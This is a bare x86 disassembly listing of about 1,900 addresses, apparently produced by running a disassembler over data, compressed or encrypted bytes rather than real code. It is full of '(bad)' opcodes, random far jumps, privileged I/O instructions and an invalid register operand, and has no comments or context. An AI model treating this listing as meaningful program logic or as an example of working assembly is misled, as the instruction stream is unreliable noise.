  414aeb:	inc    edi
  414aec:	leave  
  414aed:	test   BYTE PTR [eax+0x1],al
  414af0:	(bad)
  414af3:	repnz idiv DWORD PTR [edi]
  414af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414af7:	test   eax,0xcdd7fa26
  414afc:	int    0x66
  414afe:	test   dh,ah
  414b00:	out    0x5f,eax
  414b02:	xchg   edi,eax
  414b03:	cmp    eax,0x29983b6
  414b08:	add    esp,DWORD PTR [ebp-0x11af490e]
  414b0e:	and    eax,0x39df2c33
  414b13:	hlt    
  414b14:	jb     0x414b21
  414b16:	(bad)  
  414b17:	xor    dl,BYTE PTR [esi]
  414b19:	mov    edx,ebp
  414b1b:	push   ds
  414b1c:	jmp    0xe85e:0x27a91689
  414b23:	daa    
  414b24:	dec    esi
  414b25:	inc    eax
  414b26:	fild   QWORD PTR ds:0x2ac5e660
  414b2c:	(bad)  
  414b2d:	ror    BYTE PTR [edi+0x59],cl
  414b30:	push   cs
  414b31:	mov    eax,ds:0xc1682ef2
  414b36:	xchg   ebx,eax
  414b37:	push   ebp
  414b38:	jo     0x414b1f
  414b3a:	sbb    eax,DWORD PTR [edi-0x7b]
  414b3d:	ins    DWORD PTR es:[edi],dx
  414b3e:	mov    eax,0x2fb3de40
  414b43:	mov    cl,BYTE PTR [eax]
  414b45:	cmp    al,0x8c
  414b47:	inc    eax
  414b48:	xchg   ebx,eax
  414b49:	mov    ds:0x369094f7,al
  414b4e:	fbld   TBYTE PTR [esi-0x6d2ec904]
  414b54:	cmp    al,0x59
  414b56:	stc    
  414b57:	and    BYTE PTR [eax],ch
  414b59:	and    esi,esi
  414b5b:	xchg   ecx,eax
  414b5c:	jnp    0x414b36
  414b5e:	dec    eax
  414b5f:	jl     0x414b3b
  414b61:	mov    ds:0xc96ccd99,al
  414b66:	push   0x13
  414b68:	xor    BYTE PTR [ebx+0x75492fec],bl
  414b6e:	cmp    edi,esp
  414b70:	pop    esp
  414b71:	fisubr DWORD PTR [edx+edi*4-0x7ef0c620]
  414b78:	add    eax,0x2a92566f
  414b7d:	xchg   ebx,eax
  414b7e:	adc    eax,0xde61d0ce
  414b83:	sbb    bl,BYTE PTR [ecx-0x76417025]
  414b89:	adc    dh,BYTE PTR [esi]
  414b8b:	lods   eax,DWORD PTR ds:[esi]
  414b8c:	loop   0x414b32
  414b8e:	jl     0x414c07
  414b90:	push   DWORD PTR [ebx+0x33]
  414b93:	scas   al,BYTE PTR es:[edi]
  414b94:	jae    0x414b9a
  414b96:	or     BYTE PTR [eax+0x86a39c3],ah
  414b9c:	cmp    al,0x99
  414b9e:	inc    esp
  414b9f:	jl     0x414bed
  414ba1:	pop    ss
  414ba2:	(bad)  
  414ba3:	lods   eax,DWORD PTR ds:[esi]
  414ba4:	aam    0x8a
  414ba6:	fst    st(2)
  414ba8:	pushf  
  414ba9:	sbb    DWORD PTR [edx+0x34],edx
  414bac:	inc    edi
  414bad:	cdq    
  414bae:	xor    al,0x6a
  414bb0:	jb     0x414bde
  414bb2:	fisttp QWORD PTR [ecx-0x5f3f9d31]
  414bb8:	es add al,0x27
  414bbb:	add    dl,BYTE PTR [ebx]
  414bbd:	(bad)  
  414bbe:	je     0x414bc7
  414bc0:	popf   
  414bc1:	push   es
  414bc2:	adc    esp,esi
  414bc4:	sub    DWORD PTR [ebx+0x14],edi
  414bc7:	push   ds
  414bc8:	cdq    
  414bc9:	push   ss
  414bca:	aas    
  414bcb:	push   ss
  414bcc:	out    0xd0,eax
  414bce:	outs   dx,DWORD PTR ds:[esi]
  414bcf:	call   FWORD PTR [edi]
  414bd1:	mov    WORD PTR [di-0x5814],gs
  414bd6:	loopne 0x414c22
  414bd8:	das    
  414bd9:	sbb    dh,BYTE PTR [ecx+ebx*8-0x3a]
  414bdd:	adc    BYTE PTR [ecx-0x7e],dl
  414be0:	xchg   BYTE PTR [esi+ebp*8+0x57],dl
  414be4:	xor    BYTE PTR [esi],bh
  414be6:	jae    0x414c41
  414be8:	shr    DWORD PTR [esi],1
  414bea:	cdq    
  414beb:	add    esp,DWORD PTR [edx]
  414bed:	dec    eax
  414bee:	enter  0x326b,0x91
  414bf2:	push   0x39
  414bf4:	daa    
  414bf5:	mov    ecx,0xe7724ed4
  414bfa:	xor    DWORD PTR [edx-0x46],0xd23f7dd6
  414c01:	arpl   WORD PTR [esi+ebp*4+0x6219d982],bx
  414c08:	jb     0x414c2c
  414c0a:	dec    eax
  414c0b:	(bad)  [ecx+0x21]
  414c0e:	addr16 imul ebx,ecx,0x38
  414c12:	in     al,dx
  414c13:	sbb    eax,0x913e0123
  414c18:	dec    esi
  414c19:	or     esp,DWORD PTR [edx-0x41]
  414c1c:	int3   
  414c1d:	xor    dl,bh
  414c1f:	pop    esi
  414c20:	jns    0x414c70
  414c22:	lock and dh,ch
  414c25:	mov    ebp,0xd69f906
  414c2a:	lds    ebp,FWORD PTR [edx-0xefdb1a]
  414c30:	adc    al,0x5f
  414c32:	dec    ebx
  414c33:	inc    ebp
  414c34:	or     eax,0x3136cdc2
  414c39:	shl    DWORD PTR [edi+0x1a],0x22
  414c3d:	outs   dx,DWORD PTR ds:[esi]
  414c3e:	lahf   
  414c3f:	mov    ch,0x60
  414c41:	arpl   WORD PTR [ebx-0x1ce4c369],dx
  414c47:	mov    al,ds:0xee75c491
  414c4c:	sub    dl,BYTE PTR [edx]
  414c4e:	div    DWORD PTR [ebp+0xf]
  414c51:	ret    0x18db
  414c54:	push   ebp
  414c55:	ins    DWORD PTR es:[edi],dx
  414c56:	push   eax
  414c57:	xchg   ecx,eax
  414c58:	stos   BYTE PTR es:[edi],al
  414c59:	mov    dh,BYTE PTR [esi-0x77]
  414c5c:	pop    ecx
  414c5d:	cmp    BYTE PTR gs:[edx-0x20],bl
  414c61:	nop
  414c62:	(bad)  
  414c63:	(bad)  
  414c64:	jp     0x414ce1
  414c66:	sbb    edx,DWORD PTR ds:0x32983eb2
  414c6c:	inc    ebx
  414c6d:	fs xchg ebx,eax
  414c6f:	nop
  414c70:	mov    dl,0x39
  414c72:	les    esi,FWORD PTR [edi-0x6b]
  414c75:	dec    ebp
  414c76:	out    dx,eax
  414c77:	or     dh,BYTE PTR [eax+0x6c]
  414c7a:	mov    BYTE PTR [edx],dh
  414c7c:	sbb    ch,bh
  414c7e:	scas   al,BYTE PTR es:[edi]
  414c7f:	push   ebp
  414c80:	mov    eax,0x20f542f6
  414c85:	mov    DWORD PTR [ebx-0xd94c4e9],edx
  414c8b:	jbe    0x414c41
  414c8d:	lahf   
  414c8e:	push   ds
  414c8f:	xchg   BYTE PTR [esi+edx*8],dh
  414c92:	mov    edx,0x21bcf003
  414c97:	push   esp
  414c98:	inc    ebx
  414c99:	imul   ebx,DWORD PTR ds:0xe33f8012,0xe
  414ca0:	je     0x414cbf
  414ca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ca3:	pop    ecx
  414ca4:	push   cs
  414ca5:	xchg   dl,cl
  414ca7:	fmul   st(5),st
  414ca9:	ss mov cl,0x3b
  414cac:	push   0xffffffe3
  414cae:	mov    dl,0xf2
  414cb0:	jp     0x414c4b
  414cb2:	fst    QWORD PTR [eax-0x1]
  414cb5:	push   ebp
  414cb6:	cmc    
  414cb7:	cmp    dl,cl
  414cb9:	cld    
  414cba:	(bad)
  414cbd:	outs   dx,DWORD PTR ds:[esi]
  414cbe:	and    eax,0xc21ebee9
  414cc3:	out    dx,eax
  414cc4:	(bad)  
  414cc5:	sahf   
  414cc6:	add    al,0xe1
  414cc8:	jb     0x414cf0
  414cca:	aaa    
  414ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ccc:	mov    ah,0xb6
  414cce:	xor    dh,ch
  414cd0:	lds    edi,FWORD PTR [eax-0x4170288f]
  414cd6:	sub    BYTE PTR [ecx-0x9],al
  414cd9:	loopne 0x414c62
  414cdb:	fdivr  QWORD PTR [edi+0x571c4c1]
  414ce1:	push   esp
  414ce2:	adc    ebp,DWORD PTR [ebx+0x16d2260a]
  414ce8:	dec    esi
  414ce9:	dec    BYTE PTR [esp+eiz*4-0x71193696]
  414cf0:	inc    esp
  414cf1:	cmp    al,0x8
  414cf3:	lahf   
  414cf4:	sub    eax,0x18726c66
  414cf9:	mov    bl,0xec
  414cfb:	dec    edi
  414cfc:	adc    BYTE PTR [eax-0x70],cl
  414cff:	cdq    
  414d00:	xor    al,0xcb
  414d02:	inc    eax
  414d03:	arpl   cx,si
  414d05:	cmp    BYTE PTR [ebx+0xf],dh
  414d08:	stos   BYTE PTR es:[edi],al
  414d09:	ss add al,ch
  414d0c:	and    BYTE PTR [edi+0x53],0x55
  414d10:	or     ch,al
  414d12:	std    
  414d13:	imul   ebp,DWORD PTR [ecx+0x67],0x726b8a78
  414d1a:	jne    0x414d16
  414d1c:	jae    0x414d91
  414d1e:	dec    esp
  414d1f:	mov    edx,0xd37ab044
  414d24:	pop    ds
  414d25:	add    esi,DWORD PTR [ecx+esi*8]
  414d28:	sbb    BYTE PTR [edi],cl
  414d2a:	stos   DWORD PTR es:[edi],eax
  414d2b:	add    BYTE PTR [edx+0x1],0xb7
  414d2f:	shl    BYTE PTR [ecx+0x45],1
  414d32:	xor    eax,0xcdc66b0a
  414d37:	rol    BYTE PTR [ecx-0x6c],1
  414d3a:	ds pop ebx
  414d3c:	das    
  414d3d:	lahf   
  414d3e:	sbb    ch,bl
  414d40:	jge    0x414d0e
  414d42:	mov    dl,0x93
  414d44:	into   
  414d45:	ret    
  414d46:	mov    esp,gs
  414d48:	sub    ebp,DWORD PTR [ebx+0x5]
  414d4b:	int3   
  414d4c:	xor    eax,0xb341597e
  414d51:	hlt    
  414d52:	jns    0x414d21
  414d54:	cmp    al,0x0
  414d56:	mov    bh,0xda
  414d58:	out    0x1e,al
  414d5a:	nop
  414d5b:	cld    
  414d5c:	xchg   esp,eax
  414d5d:	mov    bh,0x7d
  414d5f:	and    ebp,edi
  414d61:	arpl   WORD PTR [eax],dx
  414d63:	js     0x414d07
  414d65:	adc    dl,BYTE PTR [edx+esi*2]
  414d68:	xchg   BYTE PTR [edi],cl
  414d6a:	jmp    0xe55e:0xa9e57903
  414d71:	test   ah,bl
  414d73:	aam    0x58
  414d75:	cmp    BYTE PTR [ecx-0x2a03f142],bh
  414d7b:	sub    edi,DWORD PTR [edi+0x39]
  414d7e:	sub    ebp,DWORD PTR [ebx+ebp*1-0x1dfdb974]
  414d85:	xor    DWORD PTR [edx-0x6a],edi
  414d88:	stos   DWORD PTR es:[edi],eax
  414d89:	clc    
  414d8a:	dec    eax
  414d8b:	cld    
  414d8c:	jecxz  0x414d67
  414d8e:	jae    0x414dea
  414d90:	xor    al,0x60
  414d92:	inc    ebp
  414d93:	jmp    0x39a4:0x8eda9f38
  414d9a:	mov    ah,0x44
  414d9c:	add    al,0xa3
  414d9e:	leave  
  414d9f:	iret   
  414da0:	loop   0x414e19
  414da2:	xor    eax,0x47dd458a
  414da7:	cli    
  414da8:	dec    ebp
  414da9:	outs   dx,BYTE PTR ds:[esi]
  414daa:	in     eax,0xeb
  414dac:	pop    edx
  414dad:	out    0x92,eax
  414daf:	std    
  414db0:	scas   al,BYTE PTR es:[edi]
  414db1:	arpl   WORD PTR [ebx-0x11],bx
  414db4:	int    0x2
  414db6:	popf   
  414db7:	pushw  0x5bf4
  414dbb:	sub    eax,DWORD PTR [edx]
  414dbd:	pushf  
  414dbe:	pop    eax
  414dbf:	xchg   DWORD PTR [edi+0x2fbb9683],esp
  414dc5:	es push esp
  414dc7:	not    DWORD PTR [edx+0x12f9e869]
  414dcd:	pop    edi
  414dce:	push   ds
  414dcf:	sub    dl,BYTE PTR [esi]
  414dd1:	(bad)  
  414dd2:	jg     0x414dc6
  414dd4:	shl    DWORD PTR [ecx],0x32
  414dd7:	jns    0x414e55
  414dd9:	pop    edi
  414dda:	loope  0x414d9e
  414ddc:	mov    ah,0x92
  414dde:	mov    dl,0x7c
  414de0:	inc    esp
  414de1:	jge    0x414e18
  414de3:	sub    BYTE PTR [ebx+edi*2],bh
  414de6:	popa   
  414de7:	sbb    DWORD PTR [edi-0x69],eax
  414dea:	push   esp
  414deb:	stos   DWORD PTR es:[edi],eax
  414dec:	rol    ch,cl
  414dee:	(bad)  
  414def:	in     al,0xb5
  414df1:	dec    edx
  414df2:	shl    DWORD PTR [edi+0x63797556],cl
  414df8:	aaa    
  414df9:	sbb    DWORD PTR [esi],ecx
  414dfb:	fwait
  414dfc:	js     0x414d7f
  414dfe:	sub    DWORD PTR [esi+0x265ceb51],ecx
  414e04:	jmp    esp
  414e06:	popa   
  414e07:	fist   WORD PTR [ebx+0x61573305]
  414e0d:	inc    ebx
  414e0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e0f:	aas    
  414e10:	mul    esp
  414e12:	and    ebx,DWORD PTR [eax]
  414e14:	xchg   edx,eax
  414e15:	lahf   
  414e16:	lods   al,BYTE PTR ds:[esi]
  414e17:	inc    ecx
  414e18:	xchg   cl,cl
  414e1a:	xchg   edi,eax
  414e1b:	sti    
  414e1c:	sbb    BYTE PTR [edx-0x4e],ah
  414e1f:	aad    0xb5
  414e21:	clc    
  414e22:	or     dl,BYTE PTR [ecx-0x39]
  414e25:	test   al,0x41
  414e27:	sbb    eax,0x34d9b26b
  414e2c:	retf   
  414e2d:	mov    ah,0xe8
  414e2f:	xor    dh,dh
  414e31:	ret    0x76b7
  414e34:	stos   BYTE PTR es:[edi],al
  414e35:	and    bh,bl
  414e37:	pop    ds
  414e38:	unpckhps xmm7,xmm7
  414e3b:	jmp    0x414e42
  414e3d:	in     eax,0xab
  414e3f:	je     0x414e73
  414e41:	rcr    DWORD PTR [edi+0x276f0ddb],1
  414e47:	or     BYTE PTR [edx+edi*4-0x2c],0x4b
  414e4c:	or     al,0xee
  414e4e:	stos   DWORD PTR es:[edi],eax
  414e4f:	fwait
  414e50:	int    0xca
  414e52:	shl    BYTE PTR [ebx-0x14fd7b71],1
  414e58:	xchg   esp,eax
  414e59:	push   0x54
  414e5b:	sbb    eax,0x91c670ab
  414e60:	(bad)  
  414e61:	imul   edx,DWORD PTR ss:[esi-0x49],0xffffffe7
  414e66:	popa   
  414e67:	das    
  414e68:	pop    ebx
  414e69:	pop    edx
  414e6a:	dec    edx
  414e6b:	sbb    dh,BYTE PTR [edi+0x1578ecb]
  414e71:	mov    cl,BYTE PTR [esi]
  414e73:	jg     0x414e93
  414e75:	rcl    dl,cl
  414e77:	stos   BYTE PTR es:[edi],al
  414e78:	aam    0xf5
  414e7a:	adc    al,0x30
  414e7c:	jle    0x414edc
  414e7e:	out    0x47,eax
  414e80:	stc    
  414e81:	js     0x414e67
  414e83:	and    edi,esi
  414e85:	in     eax,0x4a
  414e87:	pop    edi
  414e88:	ret    0x6f01
  414e8b:	jp     0x414e9c
  414e8d:	inc    ebp
  414e8e:	push   ebx
  414e8f:	mov    ss,eax
  414e91:	mov    edi,0x2e7b318c
  414e96:	ins    DWORD PTR es:[edi],dx
  414e97:	mov    bh,0xac
  414e99:	les    esp,FWORD PTR [eax+0x7ab13ea3]
  414e9f:	xchg   ebp,eax
  414ea0:	jb     0x414f01
  414ea2:	xchg   esp,eax
  414ea3:	addr16 ret 
  414ea5:	push   ebx
  414ea6:	(bad)  
  414ea7:	ins    BYTE PTR es:[edi],dx
  414ea8:	xchg   ebx,eax
  414ea9:	dec    ebp
  414eaa:	ret    0xb09c
  414ead:	dec    BYTE PTR [edx+0x72]
  414eb0:	lea    ecx,[ebp-0x4d]
  414eb3:	and    DWORD PTR [ebx],esp
  414eb5:	xchg   esp,eax
  414eb6:	xchg   ebp,eax
  414eb7:	repz xchg edi,eax
  414eb9:	lods   eax,DWORD PTR ds:[esi]
  414eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ebb:	ret    
  414ebc:	retf   
  414ebd:	rol    ebx,0xd6
  414ec0:	in     al,dx
  414ec1:	dec    ebx
  414ec2:	jae    0x414f2b
  414ec4:	ror    ebx,0x4b
  414ec7:	jecxz  0x414f30
  414ec9:	cmp    BYTE PTR [eax-0x45],0x30
  414ecd:	dec    eax
  414ece:	mov    al,ds:0xf8cc373
  414ed3:	cmp    edi,esp
  414ed5:	fisubr DWORD PTR [ebp+edi*1-0x13adccf2]
  414edc:	xchg   esi,eax
  414edd:	mov    BYTE PTR [ecx-0x3035970a],0x2d
  414ee4:	mov    al,0x34
  414ee6:	inc    edi
  414ee7:	lea    esi,[ebx+0x4768a174]
  414eed:	test   al,0xd3
  414eef:	push   eax
  414ef0:	(bad)  
  414ef2:	and    DWORD PTR [eax-0x23754af3],ebp
  414ef8:	popf   
  414ef9:	cwde   
  414efa:	push   cs
  414efb:	xchg   edi,eax
  414efc:	sub    BYTE PTR [ecx+eiz*2+0x6a8bc05b],ch
  414f03:	push   0x69
  414f05:	sub    al,BYTE PTR [edi+0x78]
  414f08:	adc    BYTE PTR [esi+0x1a015f00],ch
  414f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f0f:	pushf  
  414f10:	out    dx,al
  414f11:	jmp    0x414f79
  414f13:	add    BYTE PTR [eax+0xe],al
  414f16:	mov    ecx,0x367eca7c
  414f1b:	push   ebx
  414f1c:	jg     0x414f7b
  414f1e:	mov    ds:0x146174bd,eax
  414f23:	loopne 0x414f09
  414f25:	aad    0x30
  414f27:	in     eax,dx
  414f28:	test   ebx,edi
  414f2a:	fild   QWORD PTR [edi+0x4099a970]
  414f30:	add    ebx,esp
  414f32:	loopne 0x414f7b
  414f34:	ret    
  414f35:	jo     0x414f1f
  414f37:	clc    
  414f38:	push   0xffffffd7
  414f3a:	sub    edx,ebp
  414f3c:	out    0x59,eax
  414f3e:	jmp    0x2759:0x4dbda558
  414f45:	pop    es
  414f46:	push   ebx
  414f47:	mov    ebx,0x2c3d6d8a
  414f4c:	inc    eax
  414f4d:	rep outs dx,BYTE PTR ds:[esi]
  414f4f:	(bad)  [ecx+0x45]
  414f52:	mov    ds:0x45994842,eax
  414f57:	push   ds
  414f58:	retf   0x14a4
  414f5b:	pushf  
  414f5c:	mov    ecx,0xeecfc8a4
  414f61:	pop    edx
  414f62:	and    BYTE PTR [ecx+0x20],bl
  414f65:	cmp    dh,BYTE PTR [esi]
  414f67:	xchg   BYTE PTR [ebp+ebp*4+0x71],dh
  414f6b:	bound  esp,QWORD PTR [edi+0x6c4dd285]
  414f71:	sbb    DWORD PTR [eax],ebx
  414f73:	sar    DWORD PTR [ecx-0x7c25a99],cl
  414f79:	add    ah,BYTE PTR [ebx+0x14461f4d]
  414f7f:	in     al,0xc0
  414f81:	(bad)  
  414f82:	out    dx,al
  414f83:	pop    ss
  414f84:	add    BYTE PTR [edi-0x497c6aac],bh
  414f8a:	nop
  414f8b:	loopne 0x414fce
  414f8d:	sbb    bl,bl
  414f8f:	mov    al,0x9e
  414f91:	aam    0xfa
  414f93:	sbb    DWORD PTR [edx-0x47],0xde2e989f
  414f9a:	or     DWORD PTR [ebx+eax*1+0x6326070d],ebx
  414fa1:	xchg   edi,eax
  414fa2:	loope  0x414fab
  414fa4:	sub    cl,BYTE PTR [esi+0x8a30e88]
  414faa:	inc    ebx
  414fab:	add    ch,bl
  414fad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fae:	(bad)  
  414faf:	sub    al,0xd2
  414fb1:	xchg   ebx,eax
  414fb2:	imul   ecx,DWORD PTR [edx],0xfd53d42
  414fb8:	dec    esp
  414fb9:	xchg   ebx,eax
  414fba:	jns    0x414f4a
  414fbc:	les    ebp,FWORD PTR [ebx]
  414fbe:	das    
  414fbf:	xor    ebp,DWORD PTR [ecx+0x3ce58396]
  414fc5:	xlat   BYTE PTR ds:[ebx]
  414fc6:	std    
  414fc7:	scas   al,BYTE PTR es:[edi]
  414fc8:	mov    ss,WORD PTR [eax-0x1842dc6b]
  414fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fcf:	test   al,0xb5
  414fd1:	jnp    0x414fa4
  414fd3:	clc    
  414fd4:	nop
  414fd5:	and    DWORD PTR [ecx],ebx
  414fd7:	and    eax,0xc8407a41
  414fdc:	xchg   esi,eax
  414fdd:	imul   edi,DWORD PTR [ecx+0x34],0x47
  414fe1:	(bad)  
  414fe2:	stos   DWORD PTR es:[edi],eax
  414fe3:	mov    esi,0x98fe3dde
  414fe8:	sbb    edi,DWORD PTR [ecx-0x40]
  414feb:	mov    ch,0x4e
  414fed:	push   ds
  414fee:	or     dl,BYTE PTR [edi-0x135f3453]
  414ff4:	out    dx,eax
  414ff5:	mov    eax,DWORD PTR [edi]
  414ff7:	mov    esp,0x2ed912a2
  414ffc:	into   
  414ffd:	out    dx,al
  414ffe:	pop    esi
  414fff:	and    al,0xcc
  415001:	repnz ror BYTE PTR [esi-0xb],0x5b
  415006:	and    ebp,DWORD PTR [esi-0x3cc051cf]
  41500c:	and    BYTE PTR [eax+ebp*2],bh
  41500f:	ins    BYTE PTR es:[edi],dx
  415010:	aad    0x8c
  415012:	repnz popf 
  415014:	lahf   
  415015:	ins    DWORD PTR es:[edi],dx
  415016:	and    al,0x5f
  415018:	jbe    0x415035
  41501a:	(bad)  
  41501b:	leave  
  41501c:	mov    ah,0xbc
  41501e:	mov    al,dh
  415020:	cmp    bh,BYTE PTR [edi]
  415022:	imul   edx,DWORD PTR [ebp+ecx*2-0x43640078],0xffffffef
  41502a:	push   0x21
  41502c:	loop   0x414fc2
  41502e:	or     al,0x54
  415030:	outs   dx,DWORD PTR ds:[esi]
  415031:	dec    ebp
  415032:	lods   eax,DWORD PTR ds:[esi]
  415033:	push   ecx
  415034:	inc    esi
  415035:	mov    esi,0xb03c4dd0
  41503a:	jne    0x414fd4
  41503c:	jns    0x415042
  41503e:	(bad)  [ebx+0x12585396]
  415044:	xor    eax,DWORD PTR [esi-0x2db2464]
  41504a:	hlt    
  41504b:	data16 mov dl,0xb7
  41504e:	std    
  41504f:	bnd jbe 0x415099
  415052:	inc    ecx
  415053:	add    al,cl
  415055:	retf   
  415056:	fcmovb st,st(0)
  415058:	loop   0x41509e
  41505a:	scas   al,BYTE PTR es:[edi]
  41505b:	add    eax,0xa0f14d38
  415060:	lahf   
  415061:	(bad)  
  415062:	cld    
  415063:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415064:	fs enter 0xf581,0x75
  415069:	cmp    ebp,DWORD PTR [eax-0x45]
  41506c:	cmp    bl,0x8
  41506f:	add    ch,BYTE PTR ds:0xe5f39d2c
  415075:	popf   
  415076:	mov    eax,ds:0x55ccedf4
  41507b:	xchg   ecx,eax
  41507c:	or     DWORD PTR [edi],edi
  41507e:	pop    eax
  41507f:	push   es
  415080:	pop    ebx
  415081:	repz mov ch,0x12
  415084:	mov    dh,0x1e
  415086:	lahf   
  415087:	jecxz  0x4150ca
  415089:	(bad)  
  41508a:	pop    esi
  41508b:	sub    eax,ebx
  41508d:	or     BYTE PTR [ebp+0x157e9760],bl
  415093:	aaa    
  415094:	xchg   esp,eax
  415095:	push   es
  415096:	xor    BYTE PTR [ebp+0x29],bh
  415099:	(bad)  
  41509a:	ins    DWORD PTR es:[edi],dx
  41509b:	shl    BYTE PTR [esi-0x4c20f1f9],cl
  4150a1:	jne    0x41511f
  4150a3:	jne    0x41506e
  4150a5:	mov    cl,0xb7
  4150a7:	dec    ecx
  4150a8:	lock sub eax,0x1262ddac
  4150ae:	sub    ecx,0x28feb26
  4150b4:	mov    DWORD PTR [eax+0x3a173748],esp
  4150ba:	jmp    0x4150f3
  4150bc:	cmp    eax,eax
  4150be:	cdq    
  4150bf:	jle    0x415057
  4150c1:	fyl2xp1 
  4150c3:	push   esp
  4150c4:	jmp    0xbe3d:0x6bfb13c8
  4150cb:	call   0x4cce8766
  4150d0:	adc    ah,cl
  4150d2:	adc    ch,ch
  4150d4:	(bad)  
  4150d5:	pop    esi
  4150d6:	mov    ebp,0x2a13b498
  4150db:	inc    eax
  4150dc:	add    DWORD PTR [ebx+ecx*8-0x4d],edi
  4150e0:	mov    edx,0x7e38c1bd
  4150e5:	retf   
  4150e6:	ror    DWORD PTR [ebp+0x48680d6],0x50
  4150ed:	mov    ebp,0xe0abeee5
  4150f2:	inc    ecx
  4150f3:	je     0x4150dd
  4150f5:	sbb    eax,0xc5bad77a
  4150fa:	loop   0x415088
  4150fc:	and    bl,BYTE PTR [ebp+0x4c]
  4150ff:	je     0x415090
  415101:	pop    ebx
  415102:	pop    eax
  415103:	mov    ebp,DWORD PTR [edx]
  415105:	das    
  415106:	mov    ah,0x77
  415108:	bnd ja 0x4150cd
  41510b:	js     0x4150f3
  41510d:	shr    BYTE PTR [ebx],cl
  41510f:	in     al,dx
  415110:	xlat   BYTE PTR ds:[ebx]
  415111:	sbb    DWORD PTR [ecx+esi*1],esp
  415114:	ins    BYTE PTR es:[edi],dx
  415115:	mov    DWORD PTR [edx*8-0x30d7d05e],ecx
  41511c:	sbb    dl,BYTE PTR [ecx]
  41511e:	xchg   ecx,eax
  41511f:	(bad)  
  415120:	jne    0x415196
  415122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415123:	mov    DWORD PTR [ecx+eiz*1-0x50],edx
  415127:	adc    eax,0xcdc449ad
  41512c:	test   bh,dl
  41512e:	jne    0x415153
  415130:	mov    db0,edx
  415133:	mov    dl,0xa8
  415135:	dec    ebp
  415136:	xchg   ch,bl
  415138:	inc    eax
  415139:	(bad)  
  41513a:	mov    eax,0x1835bbb2
  41513f:	mov    cl,0x6f
  415141:	sbb    DWORD PTR [edx+0x30],ecx
  415144:	inc    ecx
  415145:	cwde   
  415146:	jp     0x41512a
  415148:	stc    
  415149:	gs scas al,BYTE PTR es:[edi]
  41514b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41514c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41514d:	jmp    DWORD PTR [edi-0x6ae7054c]
  415153:	jnp    0x4150d8
  415155:	add    al,0xfb
  415157:	cmp    ecx,0x6bba4667
  41515d:	xor    DWORD PTR [ebx+0x4602de66],ecx
  415163:	cmp    eax,0x5562f0ec
  415168:	arpl   WORD PTR [eax],di
  41516a:	pop    ds
  41516b:	in     eax,0x4c
  41516d:	addr16 add eax,0xe3c51bc9
  415173:	add    eax,0x5b7ea360
  415178:	shr    BYTE PTR [ecx+esi*8],1
  41517b:	fcomip st,st(3)
  41517d:	iret   
  41517e:	in     eax,dx
  41517f:	sbb    dl,BYTE PTR [edi+0x5d]
  415182:	push   edx
  415183:	or     eax,0x58a7672f
  415188:	add    BYTE PTR [ebx+0x7b8b5a14],bh
  41518e:	outs   dx,BYTE PTR ds:[esi]
  41518f:	push   ebx
  415190:	lods   eax,DWORD PTR ds:[esi]
  415191:	push   ss
  415192:	lahf   
  415193:	daa    
  415194:	test   DWORD PTR [ecx+0x2],eax
  415197:	xchg   ebp,eax
  415198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415199:	arpl   WORD PTR [edi-0x39bb9d7c],bp
  41519f:	push   ebx
  4151a0:	ret    0x43f
  4151a3:	cmp    DWORD PTR [eax-0x5248e25e],edi
  4151a9:	sbb    edi,edx
  4151ab:	retf   0x2df4
  4151ae:	mov    ch,BYTE PTR [esi-0x6a7d5052]
  4151b4:	aam    0x2e
  4151b6:	hlt    
  4151b7:	fucompp 
  4151b9:	push   edi
  4151ba:	(bad)  
  4151bb:	sub    al,0xfa
  4151bd:	add    DWORD PTR [esp+eiz*2],ebx
  4151c0:	(bad)  
  4151c1:	and    DWORD PTR [ebx-0x22],eax
  4151c4:	cmp    al,0x72
  4151c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151c7:	std    
  4151c8:	add    ebx,ecx
  4151ca:	xor    BYTE PTR [ecx+edi*4-0x53e65ccd],bl
  4151d1:	sub    dl,ah
  4151d3:	lods   eax,DWORD PTR ds:[esi]
  4151d4:	or     al,ch
  4151d6:	mov    cl,0xc8
  4151d8:	xchg   ecx,eax
  4151d9:	jnp    0x4151e9
  4151db:	fldenv [edx]
  4151dd:	inc    edx
  4151de:	js     0x4151a8
  4151e0:	cmp    al,0x9c
  4151e2:	mov    ?,ebp
  4151e4:	mov    edx,0xe98e0667
  4151e9:	xor    ebp,0xfa05201b
  4151ef:	mov    ah,0x64
  4151f1:	or     edi,DWORD PTR [eax-0x75bce4a]
  4151f7:	push   edi
  4151f8:	ds int3 
  4151fa:	jns    0x415226
  4151fc:	fist   WORD PTR [ecx+eax*4]
  4151ff:	es in  eax,dx
  415201:	push   ebp
  415202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415203:	fldcw  WORD PTR [eax]
  415205:	or     DWORD PTR ds:0x305ebda6,edx
  41520b:	call   0xdef6:0x9868114a
  415212:	pop    es
  415213:	ficomp DWORD PTR [eax+0x73]
  415216:	add    bh,0x96
  415219:	je     0x4151a3
  41521b:	test   DWORD PTR [eax-0x6a],0xb3f24573
  415222:	pop    edi
  415223:	or     DWORD PTR [eax],eax
  415225:	pop    es
  415226:	pop    ecx
  415227:	push   ecx
  415228:	add    cl,BYTE PTR [ecx+0x67]
  41522b:	hlt    
  41522c:	push   eax
  41522d:	add    al,0x8f
  41522f:	fistp  QWORD PTR [esi-0x25cb70b3]
  415235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415236:	jl     0x4151e3
  415238:	popf   
  415239:	mov    ebx,0x788cb6aa
  41523e:	pop    edx
  41523f:	cmc    
  415240:	mov    ah,0x1f
  415242:	out    0x68,al
  415244:	out    0x59,al
  415246:	bound  ecx,QWORD PTR ss:[eax]
  415249:	cmc    
  41524a:	add    bh,BYTE PTR [ebx]
